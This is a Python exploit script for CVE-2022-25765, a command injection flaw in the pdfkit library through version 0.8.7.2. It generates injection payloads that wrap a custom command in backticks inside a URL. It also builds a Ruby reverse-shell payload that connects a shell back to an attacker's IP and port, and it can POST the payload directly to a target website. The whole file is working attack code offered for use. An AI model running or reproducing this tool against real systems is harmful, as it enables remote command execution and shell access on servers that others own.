#!/usr/bin/env python3
# Exploit Title: pdfkit v0.8.7.2 - Command Injection
# Original Author: UNICORD
# Version: 0.0.0-0.8.7.2
# Tested on: pdfkit 0.8.6
# CVE: CVE-2022–25765
# Description: The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.
# Author - Slasher (rvick)

# Imports
import time
import sys
import requests
from urllib.parse import quote


class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'


# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)


# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection

Usage:
  python3 exploit-CVE-2022–25765.py -c <command>
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -h

Options:
  -c    Custom command mode. Provide command to generate custom payload with.
  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
  -w    URL of website running vulnerable pdfkit. (Optional)
  -p    POST parameter on website running vulnerable pdfkit. (Optional)
  -h    Show this help menu.
""")
    exit()


def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')


# Run the exploit
def exploit(payload, exploitMode, postArg):

    UNICORD_ASCII()

    print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2022–25765 (pdfkit) - Command Injection{color.no}")
    loading(15)
    print(f"{color.blue}OPTIONS: {color.gold}{modes[exploitMode]}{color.no}")
    print(f"{color.blue}PAYLOAD: {color.gold}" + payload + f"{color.no}")

    if "web" in exploitMode:
        if exploitMode == "webcommand":
            print(
                f"{color.blue}WARNING: {color.gold}Wrap custom command in \"quotes\" if it has spaces.{color.no}")
        else:
            print(
                f"{color.blue}LOCALIP: {color.gold}{listenIP}:{listenPort}{color.no}")
            print(
                f"{color.blue}WARNING: {color.gold}Be sure to start a local listener on the above IP and port. \"nc -lnvp {listenPort}\".{color.no}")
        print(f"{color.blue}WEBSITE: {color.gold}{website}{color.no}")
        print(f"{color.blue}POSTARG: {color.gold}{postArg}{color.no}")
        if "http" not in website:
            print(
                f"{color.blue}ERRORED: {color.red}Make sure website has schema! Like \"http://\".{color.no}")
            exit()
        postArg = postArg + "=" + quote(payload, safe="")
        try:
            response = requests.post(website, postArg)
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Couldn't connect to website!{color.no}")
            exit()
        loading(15)
        print(f"{color.blue}EXPLOIT: {color.gold}Payload sent to website!{color.no}")
        loading(15)
        print(f"{color.blue}SUCCESS: {color.green}Exploit performed action.{color.no}")
    elif exploitMode == "command":
        print(f"{color.blue}WARNING: {color.gold}Wrap custom command in \"quotes\" if it has spaces.{color.no}")
        loading(15)
        print(
            f"{color.blue}EXPLOIT: {color.green}Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.{color.no}")
    elif exploitMode == "shell":
        print(f"{color.blue}LOCALIP: {color.gold}{listenIP}:{listenPort}{color.no}")
        print(f"{color.blue}WARNING: {color.gold}Be sure to start a local listener on the above IP and port.{color.no}")
        loading(15)
        print(
            f"{color.blue}EXPLOIT: {color.green}Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.{color.no}")

    exit()


if __name__ == "__main__":

    args = ['-h', '-c', '-s', '-w', '-p']
    modes = {'command': 'Custom Command Mode',
             'shell': 'Reverse Shell Mode',
             'webcommand': 'Custom Command Send to Target Website Mode',
             'webshell': 'Reverse Shell Sent to Target Website Mode'}
    postArg = "url"

    if args[0] in sys.argv:
        help()
    elif args[1] in sys.argv and not args[2] in sys.argv:
        try:
            if sys.argv[sys.argv.index(args[1]) + 1] in args:
                raise
            command = sys.argv[sys.argv.index(args[1]) + 1]
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Provide a custom command! \"-c <command>\"{color.no}")
            exit()
        payload = f"http://%20`{command}`"
        mode = "command"
    elif args[2] in sys.argv and not args[1] in sys.argv:
        try:
            if "-" in sys.argv[sys.argv.index(args[2]) + 1]:
                raise
            listenIP = sys.argv[sys.argv.index(args[2]) + 1]
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Provide a target and port! \"-s <target-IP> <target-port>\"{color.no}")
            exit()
        try:
            if "-" in sys.argv[sys.argv.index(args[2]) + 2]:
                raise
            listenPort = sys.argv[sys.argv.index(args[2]) + 2]
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Provide a target port! \"-t <target-IP> <target-port>\"{color.no}")
            exit()
        payload = f"http://%20`ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{str(listenIP)}\",\"{str(listenPort)}\"))'`"
        mode = "shell"
    else:
        help()

    if args[3] in sys.argv and args[4] in sys.argv:
        try:
            if "-" in sys.argv[sys.argv.index(args[3]) + 1] and len(sys.argv[sys.argv.index(args[3]) + 1]) == 2:
                raise
            website = sys.argv[sys.argv.index(args[3]) + 1]
            mode = "web" + mode
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Provide a target site and post parameter! \"-w <http://target.com/index.html> -p <parameter>\"{color.no}")
            exit()
        try:
            if "-" in sys.argv[sys.argv.index(args[4]) + 1] and len(sys.argv[sys.argv.index(args[4]) + 1]) == 2:
                raise
            postArg = sys.argv[sys.argv.index(args[4]) + 1]
        except:
            print(
                f"{color.blue}ERRORED: {color.red}Provide a target site and post parameter! \"-w <http://target.com/index.html> -p <parameter>\"{color.no}")
            exit()
    elif args[3] in sys.argv or args[4] in sys.argv:
        print(
            f"{color.blue}ERRORED: {color.red}Provide a target site and post parameter! \"-w <http://target.com/index.html> -p <parameter>\"{color.no}")
        exit()

    exploit(payload, mode, postArg)
            
